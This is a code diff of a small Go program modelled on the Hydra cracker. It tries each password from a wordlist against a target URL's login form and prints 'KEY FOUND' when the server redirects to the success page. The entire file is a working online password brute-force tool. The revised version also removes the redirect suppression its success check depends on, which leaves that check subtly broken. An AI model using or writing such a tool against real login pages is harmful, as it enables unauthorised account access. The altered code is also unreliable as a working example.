@@ -2,75 +2,76 @@ package main
 
 import (
 	"bufio"
-	"flag"
 	"fmt"
 	"net/http"
 	"os"
 	"strings"
+	"time"
 )
 
 func main() {
-	// Command-line arguments
-	username := flag.String("l", "", "Username to test")
-	passwordList := flag.String("P", "", "Path to password list")
-	url := flag.String("url", "", "Target URL")
-	successRedirect := flag.String("redirect", "", "Success redirect URL")
-	flag.Parse()
-
-	if *username == "" || *passwordList == "" || *url == "" || *successRedirect == "" {
-		fmt.Println("Usage: hydra2.go -l username -P passwordlist -url target_url -redirect success_redirect_url")
-		os.Exit(1)
+	// Parse command-line arguments
+	if len(os.Args) < 7 {
+		fmt.Println("Usage: hydra2.go -l <username> -P <passwordlist> <url> --redirect <success_url>")
+		return
 	}
 
-	// Open the password file
-	file, err := os.Open(*passwordList)
+	// Extract arguments
+	username := os.Args[2]
+	passwordListFile := os.Args[4]
+	url := os.Args[5]
+	successRedirectURL := os.Args[6]
+
+	// Open password list file
+	file, err := os.Open(passwordListFile)
 	if err != nil {
-		fmt.Printf("Error opening password list: %v\n", err)
-		os.Exit(1)
+		fmt.Println("Error opening password list file:", err)
+		return
 	}
 	defer file.Close()
 
-	// Create an HTTP client
-	client := &http.Client{
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse // Prevent automatic redirects
-		},
-	}
-
-	// Read passwords and attempt login
+	// Create a buffered reader to read passwords
 	scanner := bufio.NewScanner(file)
+
+	// Loop through password list and test each password
 	for scanner.Scan() {
 		password := scanner.Text()
+		fmt.Printf("Trying password: %s\n", password)
 
-		// Create a POST request
-		data := fmt.Sprintf("username=%s&password=%s", *username, password)
-		req, err := http.NewRequest("POST", *url, strings.NewReader(data))
+		// Build the request body
+		req, err := http.NewRequest("POST", url, strings.NewReader("username="+username+"&password="+password))
 		if err != nil {
-			fmt.Printf("Error creating request: %v\n", err)
+			fmt.Println("Error creating request:", err)
 			continue
 		}
 
+		// Set appropriate headers (adjust as needed for your application)
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-		// Send the request
+		// Perform the HTTP request
+		client := &http.Client{
+			Timeout: 10 * time.Second, // Set timeout
+		}
 		resp, err := client.Do(req)
 		if err != nil {
-			fmt.Printf("Error sending request: %v\n", err)
+			fmt.Println("Error sending request:", err)
 			continue
 		}
 		defer resp.Body.Close()
 
-		// Check for redirect to success URL
-		if resp.StatusCode == http.StatusFound && resp.Header.Get("Location") == *successRedirect {
-			fmt.Printf("KEY FOUND: %s\n", password)
+		// Check if the response URL is the redirect URL (success)
+		if resp.StatusCode == http.StatusFound && resp.Header.Get("Location") == successRedirectURL {
+			// If redirected to success page, print the password
+			fmt.Printf("KEY FOUND: [%s]\n", password)
 			return
 		}
+
+		// If no match, continue to the next password
+		fmt.Println("KEY NOT FOUND")
 	}
 
+	// Check for errors while scanning the file
 	if err := scanner.Err(); err != nil {
-		fmt.Printf("Error reading password list: %v\n", err)
-		os.Exit(1)
+		fmt.Println("Error reading password list:", err)
 	}
-
-	fmt.Println("KEY NOT FOUND")
 }
